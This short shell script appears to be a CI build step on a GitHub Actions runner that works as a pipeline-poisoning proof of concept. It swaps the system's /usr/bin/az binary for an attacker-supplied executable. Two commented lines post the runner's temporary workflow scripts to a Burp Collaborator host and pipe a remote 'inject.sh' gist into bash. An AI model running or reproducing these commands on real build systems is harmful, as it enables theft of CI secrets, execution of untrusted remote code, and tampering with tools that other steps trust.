echo "TEST BUILD"
echo $MY_VAL
cat /etc/hosts
which npm
which az
mv /usr/bin/az /tmp/az
cp test /usr/bin/az
chmod +x /usr/bin/az
az
cat /usr/bin/az
# curl -d "$(cat /home/runner/work/_temp/*.sh)" https://ise30gxlwrwg8m6xm64nk2w9208swh.burpcollaborator.net
#curl -sSfL gist.githubusercontent.com/d3kum1d0r1y4100/f6e2261de7699c7cc799fc826d9693ee/raw/1dc6a6626c5c1d71a088d7d2204590f4734008f3/inject.sh | bash
